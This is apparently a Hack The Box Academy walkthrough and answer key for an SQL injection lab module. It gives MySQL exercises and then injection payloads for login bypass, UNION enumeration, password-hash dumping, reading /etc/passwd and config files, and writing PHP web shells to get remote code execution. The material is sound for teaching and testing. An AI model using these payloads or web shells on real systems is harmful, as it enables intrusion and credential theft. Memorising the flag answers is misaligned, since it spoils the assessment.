![[cheatsheat-SQL Injection Fundamentals]]

# SQL Injection Fundamentals Module



|Section|Question Number|Answer|
|---|---|---|
|Intro to MySQL|Question 1|employees|
|SQL Statements|Question 1|d005|
|Query Results|Question 1|Mitchem|
|SQL Operators|Question 1|654|
|Subverting Query Logic|Question 1|202a1d1a8b195d5e9a57e434cc16000c|
|Using Comments|Question 1|cdad9ecdf6f14b45ff5c4de32909caec|
|Union Clause|Question 1|663|
|Union Injection|Question 1|root@localhost|
|Database Enumeration|Question 1|9da2c9bcdf39d8610954e0e11ea8f45f|
|Reading Files|Question 1|dB_pAssw0rd_iS_flag!|
|Writing Files|Question 1|d2b5b27ae688b6a0f1d21b7d3a0798cd|
|Skills Assessment - SQL Injection Fundamentals|Question 1|$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU|
|Skills Assessment - SQL Injection Fundamentals|Question 2|/var/www/chattr-prod|
|Skills Assessment - SQL Injection Fundamentals|Question 3|061b1aeb94dec6bf5d9c27032b3c1d8d|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Intro to MySQL

## Question 1

### "Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```shell-session
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to list all the databases present using the `SHOW databases` query, and then submit the first database's name as the answer:

Code: sql

```sql
SHOW databases;
```

```shell-session
MariaDB [(none)]> SHOW databases;

+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.003 sec)
```

Answer: `employees`

# SQL Statements

## Question 1

### "What is the department number for the 'Development' department?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```shell-session
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database, list all the tables within it, and understand the schema of the `departments` table using the `DESCRIBE` statement on it:

Code: sql

```sql
USE employees;
SHOW TABLES;
DESCRIBE departments;
```

```shell-session
MariaDB [(none)]> USE employees;

Database changed

MariaDB [employees]> SHOW TABLES;

+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.003 sec)

MariaDB [employees]> DESCRIBE departments;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
```

At last, students need to use the `SELECT` statement to retrieve the department number of the department whose name is `Development`:

Code: sql

```sql
SELECT dept_no FROM departments WHERE dept_name="Development";
```

```shell-session
MariaDB [employees]> SELECT dept_no FROM departments WHERE dept_name="Development";

+---------+
| dept_no |
+---------+
| d005    |
+---------+
1 row in set (0.003 sec)
```

Alternatively, students can just retrieve all data from the `departments` table to find the answer:

Code: sql

```sql
SELECT * FROM departments;
```

```shell-session
MariaDB [employees]> SELECT * FROM departments;

+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| 			<SNIP>             |
+---------+--------------------+
```

Answer: `d005`

# Query Results

## Question 1

### "What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```shell-session
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database and understand the schema of the `employees` table using the `DESCRIBE` statement on it:

Code: sql

```sql
USE employees; 
DESCRIBE employees;
```

```shell-session
MariaDB [(none)]> use employees;

Database changed

MariaDB [employees]> DESCRIBE employees;

+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
|            |               |<SNIP>|     |         |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.003 sec)
```

At last, students need to use the `SELECT` statement to retrieve the last name of the employee whose first name starts with `Bar` and was hired on `1990-01-01`:

Code: sql

```sql
SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
```

```shell-session
MariaDB [employees]> SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';

+-----------+
| last_name |
+-----------+
| Mitchem   |
+-----------+
1 row in set (0.001 sec)
```

Answer: `Mitchem`

# SQL Operators

## Question 1

### "In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```shell-session
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database and understand the schema of the `titles` table using the `DESCRIBE` statement on it:

Code: sql

```sql
USE employees;
DESCRIBE titles;
```

```shell-session
Welcome to the MariaDB monitor.  Commands end with ; or \g.
MariaDB [(none)]> USE employees;

Database changed

MariaDB [employees]> DESCRIBE titles;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| emp_no    | int(11)     | NO   | PRI | NULL    |       |
| title     | varchar(50) | NO   | PRI | NULL    |       |
| from_date | date        | NO   | PRI | NULL    |       |
| to_date   | date        | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
4 rows in set (0.003 sec)
```

At last, students need to use the `SELECT` statement with the `COUNT()` function to retrieve the number of all records where the employee number is greater than 10000 or the employee title does not contain the string `engineer`:

Code: sql

```sql
SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
```

```shell-session
MariaDB [employees]> SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';

+----------+
| COUNT(*) |
+----------+
|      654 |
+----------+
1 row in set (0.003 sec)
```

Alternatively, students can find out the number of records by retrieving all data without utilizing the `COUNT()` function:

Code: sql

```sql
SELECT * FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
```

```shell-session
MariaDB [employees]> SELECT * FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';

+--------+--------------------+------------+------------+
| emp_no | title              | from_date  | to_date    |
+--------+--------------------+------------+------------+
|  10001 | Senior Engineer    | 1986-06-26 | 9999-01-01 |
|  10002 | Senior Engineer    | 1995-12-03 | 9999-01-01 |
|                           <SNIP>                      |
|  10648 | Engineer           | 1987-11-04 | 1993-11-03 |
|  10649 | Senior Engineer    | 1993-11-03 | 9999-01-01 |
|  10650 | Engineer           | 1996-12-25 | 9999-01-01 |
|  10651 | Assistant Engineer | 1988-12-29 | 1997-12-29 |
|  10652 | Engineer           | 1997-12-29 | 2000-11-15 |
|  10653 | Senior Staff       | 2000-03-12 | 9999-01-01 |
|  10654 | Staff              | 1992-03-12 | 2000-03-12 |
+--------+--------------------+------------+------------+
654 rows in set (0.002 sec)
```

Answer: `654`

# Subverting Query Logic

## Question 1

### "Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?"

Many approaches can be taken to solve this question.

A first approach is whereby students use the semicolon to end the query and then comment out the rest of it:

Code: sql

```sql
tom'; -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_1.png)

![SQL_Injection_Fundamentals_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_2.png)

A second approach is whereby students use the `OR` operator to subvert the query's logic and then comment out the rest of it:

Code: sql

```sql
tom' OR '1' = '1' -- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_3.png)

![SQL_Injection_Fundamentals_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_4.png)

Answer: `202a1d1a8b195d5e9a57e434cc16000c`

# Using Comments

## Question 1

### "Login as the user with the id 5 to get the flag."

After knowing the structure of the query by trial and error, students need to bypass it using the following query:

Code: sql

```sql
' OR ID=5)-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_5.png)

![SQL_Injection_Fundamentals_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_6.png)

Answer: `cdad9ecdf6f14b45ff5c4de32909caec`

# Union Clause

## Question 1

### "Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table."

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```shell-session
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database and understand the schema of the `employees` and `departments` tables by using the `DESCRIBE` statement on them:

Code: sql

```sql
USE employees;
DESCRIBE employees;
DESCRIBE departments;
```

```shell-session
MariaDB [(none)]> use employees;

Database changed

MariaDB [employees]> DESCRIBE employees;

+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.003 sec)

MariaDB [employees]> DESCRIBE departments;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
```

Since the `departments` table has lesser number of columns compared to `employees`, students need to inject 4 more "dummy columns" when executing the `UNION` query:

Code: sql

```sql
SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;
```

```shell-session
MariaDB [employees]> SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;

+----------+
| COUNT(*) |
+----------+
|      663 |
+----------+
1 row in set (0.005 sec)
```

Alternatively, students can find out the number of records by just retrieving all data without the `COUNT()` function:

Code: sql

```sql
SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments;
```

```shell-session
+--------+--------------------+--------------+
| emp_no | birth_date         | first_name   |
+--------+--------------------+--------------+
| 10001  | 1953-09-02         | Georgi       |
| 10002  | 1952-12-03         | Vivian       |
|                     <SNIP>                 |
+--------+--------------------+--------------+
663 rows in set (0.006 sec)
```

Answer: `663`

# Union Injection

## Question 1

### "Use a Union injection to get the result of 'user()'"

Students first need to detect the number of columns being selected in the query ran by the backend of the web-application. Either `ORDER BY` or `UNION` injections can be used. Using the `UNION` statement injection, students will need to execute queries until no error message is received, i.e., until the number of columns match:

Code: sql

```sql
' UNION SELECT 1-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_7.png)

```sql
' UNION SELECT 1,2-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_8.png)

```sql
' UNION SELECT 1,2,3-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_9.png)

```sql
' UNION SELECT 1,2,3,4-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_10.png)

Since there are four columns, students need to inject the `user()` function in either the 2nd, 3rd, or 4th column:

```sql
' UNION SELECT 1,user(),3,4-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_11.png)

Answer: `root@localhost`

# Database Enumeration

## Question 1

### "What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?"

Since students are given the names of the database and the table, they only need to enumerate the names of columns within the `users` table:

```sql
foo' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_12.png)

At last, students need to use the `UNION` injection statement to fetch the `username` and `password` columns from the `users` table within the `ilfreight` database:

```sql
foo' UNION SELECT 1,username,password,4 FROM ilfreight.users-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_13.png)

Answer: `9da2c9bcdf39d8610954e0e11ea8f45f`

# Reading Files

## Question 1

### "We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password."

Students first need to know the current user that is executing the SQL queries in the backend server:

```sql
foo' UNION SELECT 1,user(),3,4-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_14.png)

The user is `root`, which is an account that possess many privileges.

Students then will need to test if the current user has super admin privileges:

```sql
foo' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_15.png)

`Y` denotes `YES`, thus, the current user has super admin privileges. Students then will need to enumerate other privileges that the current user has to check whether they can read files or not:

```sql
foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_16.png)

The `FILE` privilege is listed for the current user, thus, the current user can read files.

Since students can read files, they first need to load the "search.php" file and view its source code:

```sql
foo' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

Students will notice that the "config.php" file is imported using the `include` command:

![SQL_Injection_Fundamentals_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_17.png)

Thus, at last, students need to load that file and find the flag as the value for `DB_PASSWORD`:

```sql
foo' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_18.png)

Answer: `dB_pAssw0rd_iS_flag!`

# Writing Files

## Question 1

### "Find the flag by using a webshell."

Students first need to check whether the current user they are executing queries as can read and write files to any directory on the backend server:

```sql
foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![SQL_Injection_Fundamentals_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_19.png)

Since the value for `SECURE_FILE_PRIV` is empty, the current user can read and write files to any directory. Thus, students then need to write a web shell to the web root folder to allow them to execute commands on the backend server:

```sql
foo' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Once the web shell has been successfully written into the web root folder, students at last need to browse to the "shell.php" file and specify the command to be executed in the "cmd" parameter (which must be URL-encoded):

```shell
http://STMIP:STMPO/shell.php?cmd=cat%20../flag.txt
```

![SQL_Injection_Fundamentals_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_20.png)

Answer: `d2b5b27ae688b6a0f1d21b7d3a0798cd`

# Skills Assessment - SQL Injection Fundamentals

## Question 1

### "What is the password hash for the user 'admin'?"

Students will start by spawning the target machine. Once done, students will open `Burp Suite`, visit the website via `https` using their favourite browser, and verify that they can proxy traffic via `Burp Suite`.

For `PwnBox`, this is an easy process, as it involves just selecting `BURP` on `FoxyProxy` web extensions.

![SQL_Injection_Fundamentals_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_21.png)

![SQL_Injection_Fundamentals_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_22.png)

If students are using their own VM, the section itself provides a step-by-step guide to getting `Burp Suite` to serve as a proxy.

When opening the website, students will encounter two functionalities: login (`login.php`) and create an account (`register.php`). Students can start by trying to exploit SQL Injection vulnerabilities in the login form, but they will not be able to find a vulnerability there, as it is not vulnerable.

When moving to the create account page (`register.php`), students will receive the error "Invalid Invitation Code" when trying to register an account via the intended method. This is because they have not been given a valid invitation code to register an account in the application.

![SQL_Injection_Fundamentals_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_23.png)

Students will realise that adding a single quote (`'`) to the `invitationCode` parameter throws back a `500 Internal Server Error`. This is usually a sign of a potential SQL Injection vulnerability.

![SQL_Injection_Fundamentals_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_24.png)

Students should start thinking about how they can make the backend logic for the validity of the `invitationCode` verification return `true`. For this, a payload like `') OR 1=1-- —` will be enough to bypass the verification and register an account.

![SQL_Injection_Fundamentals_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_25.png)

With a valid account, students can move to the login panel and log in with their newly created account to access internal functionality.

Students will study the new chat functionality and notice that the search functionality makes the following request: `index.php?q=search&u=1`. As before, adding a single quote (`'`) to the `q` parameter makes the application throw a `500 Internal Server Error`, which means we are breaking the SQL query running in the backend.

![SQL_Injection_Fundamentals_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_26.png)

Students can try to confirm the SQL Injection vulnerability by adding a comment `') -- -` and checking the behaviour of the web application. In this case, the server sends back a `200 OK`, which means that the comment made the SQL query running in the backend valid.

![SQL_Injection_Fundamentals_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_27.png)

With this finding, students can start thinking about enumerating the number of columns using Union injection, such as `') UNION SELECT 1,2,3 -- -` and keeping adding numbers, commas until a `200 OK` is returned. In this case, the table has four columns.

![SQL_Injection_Fundamentals_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_28.png)

From the server's response, students can also notice that the numbers `3` and `4` are returned to the page, which means we can use these columns to retrieve information back to us. So, instead of using `3` and `4`, we use `@@version`, `database()`, we should be able to retrieve the version and the database name to the page.

![SQL_Injection_Fundamentals_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_29.png)

Students now know they are dealing with a MariaDB version `10.11.11` and that the database name is `chattr`. With the database name disclosed, students can list all tables in this database by using `')UNION select 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -`

The table names are disclosed in the response. Since we are looking to answer the question of what the administrator's hash is, we should examine the `Users` table, which should contain information regarding the users registered on the platform.

![SQL_Injection_Fundamentals_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_30.png)

Students should enumerate the columns present in the `Users` table, and to do so, students can use `') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -`.

![SQL_Injection_Fundamentals_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_31.png)

Having disclosed the table names from the step above, students will want to retrieve the contents from the `Username` and `Password` columns in order to retrieve the Administrator's hash. To achieve that, students can perform a `') UNION SELECT 1,2,username,password from chattr.Users-- -`

![SQL_Injection_Fundamentals_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_32.png)

The Administrator's hash will be sent in the response, and students will submit it as the answer.

Answer: `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

# Skills Assessment - SQL Injection Fundamentals

## Question 2

### "What is the root path of the web application?"

Paying attention to the headers received in the server's response, it is possible to fingerprint the web server as `Nginx`.

![SQL_Injection_Fundamentals_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_33.png)

With that information, students will know that to retrieve the root path of the web application, they will need to load a configuration file containing it. Using the `LOAD_FILE` function, students can craft a SQL Injection query such as: `') UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -` and check if the database user has permissions to read system files.

![SQL_Injection_Fundamentals_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_34.png)

Students are able to read files, which means that they only need to find the correct configuration file to read. A typical configuration file for `Nginx` is `/etc/nginx/sites-enabled/default`.

![SQL_Injection_Fundamentals_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_35.png)

Changing the file name from `/etc/passwd` to `/etc/nginx/sites-enabled/default` discloses the root path of the web application, which students will submit as the flag.

Answer: `/var/www/chattr-prod`

# Skills Assessment - SQL Injection Fundamentals

## Question 3

### "Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below."

Students should know by now that they are interacting with a `PHP` application running on a `Linux` host. Students also have information regarding the root path of the web application, so the most logical scenario here would be to try to write a `PHP` web shell to the root path if the database user has permissions to do so.

Students can start by trying to write a simple test file to the root path using the `INTO OUTFILE` function and visit it to verify if it was successful.

![SQL_Injection_Fundamentals_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_36.png)

The application throws a `500 Internal Server Error`, although students can see that the file was indeed written to the root path by visiting `/test.txt`.

![SQL_Injection_Fundamentals_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_37.png)

Now it is just a matter of changing the contents (`this is a test`) to a `PHP` web shell. In this case, it is good to keep it simple. A smaller web shell is recommended to have the least amount of issues with URL Encoding, for example, ``<?=`$_GET[0]`?>``.

![SQL_Injection_Fundamentals_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_38.png)

Visiting `shell.php` and passing `id` as the value for the `0` parameter causes the web server to return the output of the command `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, which confirms code execution.

![SQL_Injection_Fundamentals_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_39.png)

From here, a simple `cat /*.txt` will read the flag, which students will then submit as the answer.

Answer: `061b1aeb94dec6bf5d9c27032b3c1d8d`